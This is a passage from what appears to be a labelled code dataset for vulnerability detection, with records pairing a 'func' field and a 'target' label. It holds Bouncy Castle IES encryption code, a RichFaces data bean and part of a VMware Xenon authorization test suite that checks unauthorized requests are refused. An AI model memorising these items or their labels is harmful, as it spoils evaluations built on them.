null;\n    }\n\n\n    /**\n     * Set up for use in conjunction with a block cipher to handle the\n     * message.It is <b>strongly</b> recommended that the cipher is not in ECB mode.\n     *\n     * @param agree  the key agreement used as the basis for the encryption\n     * @param kdf    the key derivation function used for byte generation\n     * @param mac    the message authentication code generator for the message\n     * @param cipher the cipher to used for encrypting the message\n     */\n    public IESEngine(\n        BasicAgreement agree,\n        DerivationFunction kdf,\n        Mac mac,\n        BufferedBlockCipher cipher)\n    {\n        this.agree = agree;\n        this.kdf = kdf;\n        this.mac = mac;\n        this.macBuf = new byte[mac.getMacSize()];\n        this.cipher = cipher;\n    }\n\n    /**\n     * Initialise the encryptor.\n     *\n     * @param forEncryption whether or not this is encryption/decryption.\n     * @param privParam     our private key parameters\n     * @param pubParam      the recipient's/sender's public key parameters\n     * @param params        encoding and derivation parameters, may be wrapped to include an IV for an underlying block cipher.\n     */\n    public void init(\n        boolean forEncryption,\n        CipherParameters privParam,\n        CipherParameters pubParam,\n        CipherParameters params)\n    {\n        this.forEncryption = forEncryption;\n        this.privParam = privParam;\n        this.pubParam = pubParam;\n        this.V = new byte[0];\n\n        extractParams(params);\n    }\n\n    /**\n     * Initialise the decryptor.\n     *\n     * @param publicKey      the recipient's/sender's public key parameters\n     * @param params         encoding and derivation parameters, may be wrapped to include an IV for an underlying block cipher.\n     * @param ephemeralKeyPairGenerator             the ephemeral key pair generator to use.\n     */\n    public void init(AsymmetricKeyParameter publicKey, CipherParameters params, EphemeralKeyPairGenerator ephemeralKeyPairGenerator)\n    {\n        this.forEncryption = true;\n        this.pubParam = publicKey;\n        this.keyPairGenerator = ephemeralKeyPairGenerator;\n\n        extractParams(params);\n    }\n\n    /**\n     * Initialise the encryptor.\n     *\n     * @param privateKey      the recipient's private key.\n     * @param params          encoding and derivation parameters, may be wrapped to include an IV for an underlying block cipher.\n     * @param publicKeyParser the parser for reading the ephemeral public key.\n     */\n    public void init(AsymmetricKeyParameter privateKey, CipherParameters params, KeyParser publicKeyParser)\n    {\n        this.forEncryption = false;\n        this.privParam = privateKey;\n        this.keyParser = publicKeyParser;\n\n        extractParams(params);\n    }\n\n    private void extractParams(CipherParameters params)\n    {\n        if (params instanceof ParametersWithIV)\n        {\n            this.IV = ((ParametersWithIV)params).getIV();\n            this.param = (IESParameters)((ParametersWithIV)params).getParameters();\n        }\n        else\n        {\n            this.IV = null;\n            this.param = (IESParameters)params;\n        }\n    }\n\n    public BufferedBlockCipher getCipher()\n    {\n        return cipher;\n    }\n\n    public Mac getMac()\n    {\n        return mac;\n    }\n\n    private byte[] encryptBlock(\n        byte[] in,\n        int inOff,\n        int inLen)\n        throws InvalidCipherTextException\n    {\n        byte[] C = null, K = null, K1 = null, K2 = null;\n        int len;\n\n        if (cipher == null)\n        {\n            // Streaming mode.\n            K1 = new byte[inLen];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n\n            if (V.length != 0)\n            {\n                System.arraycopy(K, 0, K2, 0, K2.length);\n                System.arraycopy(K, K2.length, K1, 0, K1.length);\n            }\n            else\n            {\n                System.arraycopy(K, 0, K1, 0, K1.length);\n                System.arraycopy(K, inLen, K2, 0, K2.length);\n            }\n\n            C = new byte[inLen];\n\n            for (int i = 0; i != inLen; i++)\n            {\n                C[i] = (byte)(in[inOff + i] ^ K1[i]);\n            }\n            len = inLen;\n        }\n        else\n        {\n            // Block cipher mode.\n            K1 = new byte[((IESWithCipherParameters)param).getCipherKeySize() / 8];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n            System.arraycopy(K, 0, K1, 0, K1.length);\n            System.arraycopy(K, K1.length, K2, 0, K2.length);\n\n            // If iv provided use it to initialise the cipher\n            if (IV != null)\n            {\n                cipher.init(true, new ParametersWithIV(new KeyParameter(K1), IV));\n            }\n            else\n            {\n                cipher.init(true, new KeyParameter(K1));    \n            }\n            \n            C = new byte[cipher.getOutputSize(inLen)];\n            len = cipher.processBytes(in, inOff, inLen, C, 0);\n            len += cipher.doFinal(C, len);\n        }\n\n\n        // Convert the length of the encoding vector into a byte array.\n        byte[] P2 = param.getEncodingV();\n        byte[] L2 = null;\n        if (V.length != 0)\n        {\n            L2 = getLengthTag(P2);\n        }\n\n\n        // Apply the MAC.\n        byte[] T = new byte[mac.getMacSize()];\n\n        mac.init(new KeyParameter(K2));\n        mac.update(C, 0, C.length);\n        if (P2 != null)\n        {\n            mac.update(P2, 0, P2.length);\n        }\n        if (V.length != 0)\n        {\n            mac.update(L2, 0, L2.length);\n        }\n        mac.doFinal(T, 0);\n\n\n        // Output the triple (V,C,T).\n        byte[] Output = new byte[V.length + len + T.length];\n        System.arraycopy(V, 0, Output, 0, V.length);\n        System.arraycopy(C, 0, Output, V.length, len);\n        System.arraycopy(T, 0, Output, V.length + len, T.length);\n        return Output;\n    }\n\n    private byte[] decryptBlock(\n        byte[] in_enc,\n        int inOff,\n        int inLen)\n        throws InvalidCipherTextException\n    {\n        byte[] M, K, K1, K2;\n        int len = 0;\n\n        // Ensure that the length of the input is greater than the MAC in bytes\n        if (inLen < V.length + mac.getMacSize())\n        {\n            throw new InvalidCipherTextException(\"Length of input must be greater than the MAC and V combined\");\n        }\n\n        // note order is important: set up keys, do simple encryptions, check mac, do final encryption.\n        if (cipher == null)\n        {\n            // Streaming mode.\n            K1 = new byte[inLen - V.length - mac.getMacSize()];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n\n            if (V.length != 0)\n            {\n                System.arraycopy(K, 0, K2, 0, K2.length);\n                System.arraycopy(K, K2.length, K1, 0, K1.length);\n            }\n            else\n            {\n                System.arraycopy(K, 0, K1, 0, K1.length);\n                System.arraycopy(K, K1.length, K2, 0, K2.length);\n            }\n\n            // process the message\n            M = new byte[K1.length];\n\n            for (int i = 0; i != K1.length; i++)\n            {\n                M[i] = (byte)(in_enc[inOff + V.length + i] ^ K1[i]);\n            }\n        }\n        else\n        {\n            // Block cipher mode.        \n            K1 = new byte[((IESWithCipherParameters)param).getCipherKeySize() / 8];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n            System.arraycopy(K, 0, K1, 0, K1.length);\n            System.arraycopy(K, K1.length, K2, 0, K2.length);\n\n            // If IV provide use it to initialize the cipher\n            if (IV != null)\n            {\n                cipher.init(false, new ParametersWithIV(new KeyParameter(K1), IV));\n            }\n            else\n            {\n                cipher.init(false, new KeyParameter(K1));\n            }\n\n            M = new byte[cipher.getOutputSize(inLen - V.length - mac.getMacSize())];\n\n            // do initial processing\n            len = cipher.processBytes(in_enc, inOff + V.length, inLen - V.length - mac.getMacSize(), M, 0);\n        }\n\n        // Convert the length of the encoding vector into a byte array.\n        byte[] P2 = param.getEncodingV();\n        byte[] L2 = null;\n        if (V.length != 0)\n        {\n            L2 = getLengthTag(P2);\n        }\n\n        // Verify the MAC.\n        int end = inOff + inLen;\n        byte[] T1 = Arrays.copyOfRange(in_enc, end - mac.getMacSize(), end);\n\n        byte[] T2 = new byte[T1.length];\n        mac.init(new KeyParameter(K2));\n        mac.update(in_enc, inOff + V.length, inLen - V.length - T2.length);\n\n        if (P2 != null)\n        {\n            mac.update(P2, 0, P2.length);\n        }\n        if (V.length != 0)\n        {\n            mac.update(L2, 0, L2.length);\n        }\n        mac.doFinal(T2, 0);\n\n        if (!Arrays.constantTimeAreEqual(T1, T2))\n        {\n            throw new InvalidCipherTextException(\"invalid MAC\");\n        }\n\n        if (cipher == null)\n        {\n            return M;\n        }\n        else\n        {\n            len += cipher.doFinal(M, len);\n\n            return Arrays.copyOfRange(M, 0, len);\n        }\n    }\n\n\n    public byte[] processBlock(\n        byte[] in,\n        int inOff,\n        int inLen)\n        throws InvalidCipherTextException\n    {\n        if (forEncryption)\n        {\n            if (keyPairGenerator != null)\n            {\n                EphemeralKeyPair ephKeyPair = keyPairGenerator.generate();\n\n                this.privParam = ephKeyPair.getKeyPair().getPrivate();\n                this.V = ephKeyPair.getEncodedPublicKey();\n            }\n        }\n        else\n        {\n            if (keyParser != null)\n            {\n                ByteArrayInputStream bIn = new ByteArrayInputStream(in, inOff, inLen);\n\n                try\n                {\n                    this.pubParam = keyParser.readKey(bIn);\n                }\n                catch (IOException e)\n                {\n                    throw new InvalidCipherTextException(\"unable to recover ephemeral public key: \" + e.getMessage(), e);\n                }\n\n                int encLength = (inLen - bIn.available());\n                this.V = Arrays.copyOfRange(in, inOff, inOff + encLength);\n            }\n        }\n\n        // Compute the common value and convert to byte array. \n        agree.init(privParam);\n        BigInteger z = agree.calculateAgreement(pubParam);\n        byte[] Z = BigIntegers.asUnsignedByteArray(agree.getFieldSize(), z);\n\n        // Create input to KDF.  \n        if (V.length != 0)\n        {\n            byte[] VZ = Arrays.concatenate(V, Z);\n            Arrays.fill(Z, (byte)0);\n            Z = VZ;\n        }\n\n        try\n        {\n            // Initialise the KDF.\n            KDFParameters kdfParam = new KDFParameters(Z, param.getDerivationV());\n            kdf.init(kdfParam);\n\n            return forEncryption\n                ? encryptBlock(in, inOff, inLen)\n                : decryptBlock(in, inOff, inLen);\n        }\n        finally\n        {\n            Arrays.fill(Z, (byte)0);\n        }\n    }\n\n    // as described in Shroup's paper and P1363a\n    protected byte[] getLengthTag(byte[] p2)\n    {\n        byte[] L2 = new byte[8];\n        if (p2 != null)\n        {\n            Pack.longToBigEndian(p2.length * 8L, L2, 0);\n        }\n        return L2;\n    }\n}\n", "target": 0}
{"idx": 1027, "func": "package org.richfaces.demo.paint2d;\n\nimport org.ajax4jsf.resource.SerializableResource;\n\npublic class PaintData implements SerializableResource {\n\t/**\n\t * \n\t */\n\tprivate static final long serialVersionUID = 1L;\n\tString text;\n\tInteger color;\n\tfloat scale;\n\n\n\tpublic Integer getColor() {\n\t\treturn color;\n\t}\n\tpublic void setColor(Integer color) {\n\t\tthis.color = color;\n\t}\n\tpublic float getScale() {\n\t\treturn scale;\n\t}\n\tpublic void setScale(float scale) {\n\t\tthis.scale = scale;\n\t}\n\n\tpublic String getText() {\n\t\treturn text;\n\t}\n\tpublic void setText(String text) {\n\t\tthis.text = text;\n\t}\n}\n", "target": 0}
{"idx": 1028, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotEquals;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertNull;\nimport static org.junit.Assert.assertTrue;\n\nimport java.net.URI;\nimport java.security.GeneralSecurityException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Consumer;\nimport java.util.logging.Level;\n\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Operation.AuthorizationContext;\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.TestAuthorization.AuthzStatefulService.AuthzState;\nimport com.vmware.xenon.common.test.AuthorizationHelper;\nimport com.vmware.xenon.common.test.QueryTestUtils;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.TestRequestSender;\nimport com.vmware.xenon.common.test.TestRequestSender.FailureResponse;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.AuthorizationCacheUtils;\nimport com.vmware.xenon.services.common.AuthorizationContextService;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.GuestUserService;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.QueryTask;\nimport com.vmware.xenon.services.common.QueryTask.Query;\nimport com.vmware.xenon.services.common.QueryTask.Query.Builder;\nimport com.vmware.xenon.services.common.QueryTask.QueryTerm.MatchType;\nimport com.vmware.xenon.services.common.RoleService;\nimport com.vmware.xenon.services.common.RoleService.Policy;\nimport com.vmware.xenon.services.common.RoleService.RoleState;\nimport com.vmware.xenon.services.common.ServiceHostManagementService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.SystemUserService;\nimport com.vmware.xenon.services.common.TransactionService.TransactionServiceState;\nimport com.vmware.xenon.services.common.UserGroupService;\nimport com.vmware.xenon.services.common.UserGroupService.UserGroupState;\nimport com.vmware.xenon.services.common.UserService.UserState;\n\npublic class TestAuthorization extends BasicTestCase {\n\n    public static class AuthzStatelessService extends StatelessService {\n        @Override\n        public void handleRequest(Operation op) {\n            if (op.getAction() == Action.PATCH) {\n                op.complete();\n                return;\n            }\n            super.handleRequest(op);\n        }\n    }\n\n    public static class AuthzStatefulService extends StatefulService {\n\n        public static class AuthzState extends ServiceDocument {\n            public String userLink;\n        }\n\n        public AuthzStatefulService() {\n            super(AuthzState.class);\n        }\n\n        @Override\n        public void handleStart(Operation post) {\n            AuthzState body = post.getBody(AuthzState.class);\n            AuthorizationContext authorizationContext = getAuthorizationContextForSubject(\n                    body.userLink);\n\n            if (authorizationContext == null ||\n                    !authorizationContext.getClaims().getSubject().equals(body.userLink)) {\n                post.fail(Operation.STATUS_CODE_INTERNAL_ERROR);\n                return;\n            }\n            post.complete();\n        }\n    }\n\n    public int serviceCount = 10;\n\n    private String userServicePath;\n    private AuthorizationHelper authHelper;\n\n    @Override\n    public void beforeHostStart(VerificationHost host) {\n        // Enable authorization service; this is an end to end test\n        host.setAuthorizationService(new AuthorizationContextService());\n        host.setAuthorizationEnabled(true);\n        CommandLineArgumentParser.parseFromProperties(this);\n    }\n\n    @Before\n    public void enableTracing() throws Throwable {\n        // Enable operation tracing to verify tracing does not error out with auth enabled.\n        this.host.toggleOperationTracing(this.host.getUri(), true);\n    }\n\n    @After\n    public void disableTracing() throws Throwable {\n        this.host.toggleOperationTracing(this.host.getUri(), false);\n    }\n\n    @Before\n    public void setupRoles() throws Throwable {\n        this.host.setSystemAuthorizationContext();\n        this.authHelper = new AuthorizationHelper(this.host);\n        this.userServicePath = this.authHelper.createUserService(this.host, \"jane@doe.com\");\n        this.authHelper.createRoles(this.host, \"jane@doe.com\");\n        this.host.resetAuthorizationContext();\n    }\n\n    @Test\n    public void factoryGetWithOData() {\n        // GET with ODATA will be implicitly converted to a query task. Query tasks\n        // require explicit authorization for the principal to be able to create them\n        URI exampleFactoryUriWithOData = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK,\n                \"$limit=10\");\n        TestRequestSender sender = this.host.getTestRequestSender();\n        FailureResponse rsp = sender.sendAndWaitFailure(Operation.createGet(exampleFactoryUriWithOData));\n        ServiceErrorResponse errorRsp = rsp.op.getErrorResponseBody();\n        assertTrue(errorRsp.message.toLowerCase().contains(\"forbidden\"));\n        assertTrue(errorRsp.message.contains(UriUtils.URI_PARAM_ODATA_TENANTLINKS));\n\n        exampleFactoryUriWithOData = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK,\n                \"$filter=name eq someone\");\n        rsp = sender.sendAndWaitFailure(Operation.createGet(exampleFactoryUriWithOData));\n        errorRsp = rsp.op.getErrorResponseBody();\n        assertTrue(errorRsp.message.toLowerCase().contains(\"forbidden\"));\n        assertTrue(errorRsp.message.contains(UriUtils.URI_PARAM_ODATA_TENANTLINKS));\n\n        // GET without ODATA should succeed but return empty result set\n        URI exampleFactoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Operation rspOp = sender.sendAndWait(Operation.createGet(exampleFactoryUri));\n        ServiceDocumentQueryResult queryRsp = rspOp.getBody(ServiceDocumentQueryResult.class);\n        assertEquals(0L, (long) queryRsp.documentCount);\n    }\n\n    @Test\n    public void statelessServiceAuthorization() throws Throwable {\n        // assume system identity so we can create roles\n        this.host.setSystemAuthorizationContext();\n\n        String serviceLink = UUID.randomUUID().toString();\n\n        // create a specific role for a stateless service\n        String resourceGroupLink = this.authHelper.createResourceGroup(this.host,\n                \"stateless-service-group\", Builder.create()\n                        .addFieldClause(\n                                ServiceDocument.FIELD_NAME_SELF_LINK,\n                                UriUtils.URI_PATH_CHAR + serviceLink)\n                        .build());\n        this.authHelper.createRole(this.host, this.authHelper.getUserGroupLink(),\n                resourceGroupLink,\n                new HashSet<>(Arrays.asList(Action.GET, Action.POST, Action.PATCH, Action.DELETE)));\n        this.host.resetAuthorizationContext();\n\n        CompletionHandler ch = (o, e) -> {\n            if (e == null || o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                this.host.failIteration(new IllegalStateException(\n                        \"Operation did not fail with proper status code\"));\n                return;\n            }\n            this.host.completeIteration();\n        };\n\n        // assume authorized user identity\n        this.host.assumeIdentity(this.userServicePath);\n\n        // Verify startService\n        Operation post = Operation.createPost(UriUtils.buildUri(this.host, serviceLink));\n        // do not supply a body, authorization should still be applied\n        this.host.testStart(1);\n        post.setCompletion(this.host.getCompletion());\n        this.host.startService(post, new AuthzStatelessService());\n        this.host.testWait();\n\n        // stop service so we can attempt restart\n        this.host.testStart(1);\n        Operation delete = Operation.createDelete(post.getUri())\n                .setCompletion(this.host.getCompletion());\n        this.host.send(delete);\n        this.host.testWait();\n\n        // Verify DENY startService\n        this.host.resetAuthorizationContext();\n        this.host.testStart(1);\n        post = Operation.createPost(UriUtils.buildUri(this.host, serviceLink));\n        post.setCompletion(ch);\n        this.host.startService(post, new AuthzStatelessService());\n        this.host.testWait();\n\n        // assume authorized user identity\n        this.host.assumeIdentity(this.userServicePath);\n\n        // restart service\n        post = Operation.createPost(UriUtils.buildUri(this.host, serviceLink));\n        // do not supply a body, authorization should still be applied\n        this.host.testStart(1);\n        post.setCompletion(this.host.getCompletion());\n        this.host.startService(post, new AuthzStatelessService());\n        this.host.testWait();\n\n        this.host.setOperationTracingLevel(Level.FINER);\n        // Verify PATCH\n        Operation patch = Operation.createPatch(UriUtils.buildUri(this.host, serviceLink));\n        patch.setBody(new ServiceDocument());\n        this.host.testStart(1);\n        patch.setCompletion(this.host.getCompletion());\n        this.host.send(patch);\n        this.host.testWait();\n        this.host.setOperationTracingLevel(Level.ALL);\n\n        // Verify DENY PATCH\n        this.host.resetAuthorizationContext();\n        patch = Operation.createPatch(UriUtils.buildUri(this.host, serviceLink));\n        patch.setBody(new ServiceDocument());\n        this.host.testStart(1);\n        patch.setCompletion(ch);\n        this.host.send(patch);\n        this.host.testWait();\n    }\n\n    @Test\n    public void queryTasksDirectAndContinuous() throws Throwable {\n        this.host.assumeIdentity(this.userServicePath);\n        createExampleServices(\"jane\");\n\n        // do a direct, simple query first\n        this.host.createAndWaitSimpleDirectQuery(ServiceDocument.FIELD_NAME_AUTH_PRINCIPAL_LINK,\n                this.userServicePath, this.serviceCount, this.serviceCount);\n\n        // now do a paginated query to verify we can get to paged results with authz enabled\n        QueryTask qt = QueryTask.Builder.create().setResultLimit(this.serviceCount / 2)\n                .build();\n        qt.querySpec.query = Query.Builder.create()\n                .addFieldClause(ServiceDocument.FIELD_NAME_AUTH_PRINCIPAL_LINK,\n                        this.userServicePath)\n                .build();\n\n        URI taskUri = this.host.createQueryTaskService(qt);\n        this.host.waitFor(\"task not finished in time\", () -> {\n            QueryTask r = this.host.getServiceState(null, QueryTask.class, taskUri);\n            if (TaskState.isFailed(r.taskInfo)) {\n                throw new IllegalStateException(\"task failed\");\n            }\n            if (TaskState.isFinished(r.taskInfo)) {\n                qt.taskInfo = r.taskInfo;\n                qt.results = r.results;\n                return true;\n            }\n            return false;\n        });\n\n\n        TestContext ctx = this.host.testCreate(1);\n        Operation get = Operation.createGet(UriUtils.buildUri(this.host, qt.results.nextPageLink))\n                .setCompletion(ctx.getCompletion());\n        this.host.send(get);\n        ctx.await();\n\n        TestContext kryoCtx = this.host.testCreate(1);\n        Operation patchOp = Operation.createPatch(this.host, ExampleService.FACTORY_LINK + \"/foo\")\n                .setBody(new ServiceDocument())\n                .setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM)\n                .setCompletion((o, e) -> {\n                    if (e != null && o.getStatusCode() == Operation.STATUS_CODE_UNAUTHORIZED) {\n                        kryoCtx.completeIteration();\n                        return;\n                    }\n                    kryoCtx.failIteration(new IllegalStateException(\"expected a failure\"));\n                });\n        this.host.send(patchOp);\n        kryoCtx.await();\n\n        int requestCount = this.serviceCount;\n        TestContext notifyCtx = this.testCreate(requestCount);\n\n        // Verify that even though updates to the index are performed\n        // as a system user; the notification received by the subscriber of\n        // the continuous query has the same authorization context as that of\n        // user that created the continuous query.\n        Consumer<Operation> notify = (o) -> {\n            o.complete();\n            String subject = o.getAuthorizationContext().getClaims().getSubject();\n            if (!this.userServicePath.equals(subject)) {\n                notifyCtx.fail(new IllegalStateException(\n                        \"Invalid auth subject in notification: \" + subject));\n                return;\n            }\n            this.host.log(\"Received authorized notification for index patch: %s\", o.toString());\n            notifyCtx.complete();\n        };\n\n        Query q = Query.Builder.create()\n                .addKindFieldClause(ExampleServiceState.class)\n                .build();\n        QueryTask cqt = QueryTask.Builder.create().setQuery(q).build();\n\n        // Create and subscribe to the continous query as an ordinary user.\n        // do a continuous query, verify we receive some notifications\n        URI notifyURI = QueryTestUtils.startAndSubscribeToContinuousQuery(\n                this.host.getTestRequestSender(), this.host, cqt,\n                notify);\n\n        // issue updates, create some services as the system user\n        this.host.setSystemAuthorizationContext();\n        createExampleServices(\"jane\");\n        this.host.log(\"Waiting on continiuous query task notifications (%d)\", requestCount);\n        notifyCtx.await();\n        this.host.resetSystemAuthorizationContext();\n\n        this.host.assumeIdentity(this.userServicePath);\n        QueryTestUtils.stopContinuousQuerySubscription(\n                this.host.getTestRequestSender(), this.host, notifyURI,\n                cqt);\n\n    }\n\n    @Test\n    public void validateKryoOctetStreamRequests() throws Throwable {\n        Consumer<Boolean> validate = (expectUnauthorizedResponse) -> {\n            TestContext kryoCtx = this.host.testCreate(1);\n            Operation patchOp = Operation.createPatch(this.host, ExampleService.FACTORY_LINK + \"/foo\")\n                    .setBody(new ServiceDocument())\n                    .setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM)\n                    .setCompletion((o, e) -> {\n                        boolean isUnauthorizedResponse = o.getStatusCode() == Operation.STATUS_CODE_UNAUTHORIZED;\n                        if (expectUnauthorizedResponse == isUnauthorizedResponse) {\n                            kryoCtx.completeIteration();\n                            return;\n                        }\n                        kryoCtx.failIteration(new IllegalStateException(\"Response did not match expectation\"));\n                    });\n            this.host.send(patchOp);\n            kryoCtx.await();\n        };\n\n        // Validate GUEST users are not authorized for sending kryo-octet-stream requests.\n        this.host.resetAuthorizationContext();\n        validate.accept(true);\n\n        // Validate non-Guest, non-System users are also not authorized.\n        this.host.assumeIdentity(this.userServicePath);\n        validate.accept(true);\n\n        // Validate System users are allowed.\n        this.host.assumeIdentity(SystemUserService.SELF_LINK);\n        validate.accept(false);\n    }\n\n    @Test\n    public void contextPropagationOnScheduleAndRunContext() throws Throwable {\n        this.host.assumeIdentity(this.userServicePath);\n\n        AuthorizationContext callerAuthContext = OperationContext.getAuthorizationContext();\n        Runnable task = () -> {\n            if (OperationContext.getAuthorizationContext().equals(callerAuthContext)) {\n                this.host.completeIteration();\n                return;\n            }\n            this.host.failIteration(new IllegalStateException(\"Incorrect auth context obtained\"));\n        };\n\n        this.host.testStart(1);\n        this.host.schedule(task, 1, TimeUnit.MILLISECONDS);\n        this.host.testWait();\n\n        this.host.testStart(1);\n        this.host.run(task);\n        this.host.testWait();\n    }\n\n    @Test\n    public void guestAuthorization() throws Throwable {\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n\n        // Create user group for guest user\n        String userGroupLink =\n                this.authHelper.createUserGroup(this.host, \"guest-user-group\", Builder.create()\n                        .addFieldClause(\n                                ServiceDocument.FIELD_NAME_SELF_LINK,\n                                GuestUserService.SELF_LINK)\n                        .build());\n\n        // Create resource group for example service state\n        String exampleServiceResourceGroupLink =\n                this.authHelper.createResourceGroup(this.host, \"guest-resource-group\", Builder.create()\n                        .addFieldClause(\n                                ExampleServiceState.FIELD_NAME_KIND,\n                                Utils.buildKind(ExampleServiceState.class))\n                        .addFieldClause(\n                                ExampleServiceState.FIELD_NAME_NAME,\n                                \"guest\")\n                        .build());\n\n        // Create roles tying these together\n        this.authHelper.createRole(this.host, userGroupLink, exampleServiceResourceGroupLink,\n                new HashSet<>(Arrays.asList(Action.GET, Action.POST, Action.PATCH)));\n\n        // Create some example services; some accessible, some not\n        Map<URI, ExampleServiceState> exampleServices = new HashMap<>();\n        exampleServices.putAll(createExampleServices(\"jane\"));\n        exampleServices.putAll(createExampleServices(\"guest\"));\n\n        OperationContext.setAuthorizationContext(null);\n\n        TestRequestSender sender = this.host.getTestRequestSender();\n        Operation responseOp = sender.sendAndWait(Operation.createGet(this.host, ExampleService.FACTORY_LINK));\n\n        // Make sure only the authorized services were returned\n        ServiceDocumentQueryResult getResult = responseOp.getBody(ServiceDocumentQueryResult.class);\n        assertAuthorizedServicesInResult(\"guest\", exampleServices, getResult);\n        String guestLink = getResult.documentLinks.iterator().next();\n\n        // Make sure we are able to PATCH the example service.\n        ExampleServiceState state = new ExampleServiceState();\n        state.counter = 2L;\n        responseOp = sender.sendAndWait(Operation.createPatch(this.host, guestLink).setBody(state));\n        assertEquals(Operation.STATUS_CODE_OK, responseOp.getStatusCode());\n\n        // Let's try to do another PATCH using kryo-octet-stream\n        state.counter = 3L;\n        FailureResponse failureResponse = sender.sendAndWaitFailure(\n                Operation.createPatch(this.host, guestLink)\n                        .setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM)\n                        .setBody(state));\n        assertEquals(Operation.STATUS_CODE_UNAUTHORIZED, failureResponse.op.getStatusCode());\n\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        Map<String, ServiceStats.ServiceStat> stat = this.host.getServiceStats(\n                UriUtils.buildUri(this.host, ServiceUriPaths.CORE_MANAGEMENT));\n        double currentInsertCount = stat.get(\n                ServiceHostManagementService.STAT_NAME_AUTHORIZATION_CACHE_INSERT_COUNT).latestValue;\n        OperationContext.setAuthorizationContext(null);\n\n        // Make a second request and verify that the cache did not get updated, instead Xenon re-used\n        // the cached Guest authorization context.\n        sender.sendAndWait(Operation.createGet(this.host, ExampleService.FACTORY_LINK));\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        stat = this.host.getServiceStats(\n                UriUtils.buildUri(this.host, ServiceUriPaths.CORE_MANAGEMENT));\n        OperationContext.setAuthorizationContext(null);\n        double newInsertCount = stat.get(\n                ServiceHostManagementService.STAT_NAME_AUTHORIZATION_CACHE_INSERT_COUNT).latestValue;\n        assertTrue(currentInsertCount == newInsertCount);\n\n        // Make sure that Authorization Context cache in Xenon has at least one cached token.\n        double currentCacheSize = stat.get(\n                ServiceHostManagementService.STAT_NAME_AUTHORIZATION_CACHE_SIZE).latestValue;\n        assertTrue(currentCacheSize == newInsertCount);\n    }\n\n    @Test\n    public void testInvalidUserAndResourceGroup() throws Throwable {\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        AuthorizationHelper authsetupHelper = new AuthorizationHelper(this.host);\n        String email = \"foo@foo.com\";\n        String userLink = authsetupHelper.createUserService(this.host, email);\n        Query userGroupQuery = Query.Builder.create().addFieldClause(UserState.FIELD_NAME_EMAIL, email).build();\n        String userGroupLink = authsetupHelper.createUserGroup(this.host, email, userGroupQuery);\n        authsetupHelper.createRole(this.host, userGroupLink, \"foo\", EnumSet.allOf(Action.class));\n        // Assume identity\n        this.host.assumeIdentity(userLink);\n        this.host.sendAndWaitExpectSuccess(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n        // set an invalid userGroupLink for the user\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        UserState patchUserState = new UserState();\n        patchUserState.userGroupLinks = Collections.singleton(\"foo\");\n        this.host.sendAndWaitExpectSuccess(\n                Operation.createPatch(UriUtils.buildUri(this.host, userLink)).setBody(patchUserState));\n        this.host.assumeIdentity(userLink);\n        this.host.sendAndWaitExpectSuccess(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n    }\n\n    @Test\n    public void actionBasedAuthorization() throws Throwable {\n\n        // Assume Jane's identity\n        this.host.assumeIdentity(this.userServicePath);\n\n        // add docs accessible by jane\n        Map<URI, ExampleServiceState> exampleServices = createExampleServices(\"jane\");\n\n        // Execute get on factory trying to get all example services\n        final ServiceDocumentQueryResult[] factoryGetResult = new ServiceDocumentQueryResult[1];\n        Operation getFactory = Operation.createGet(\n                UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        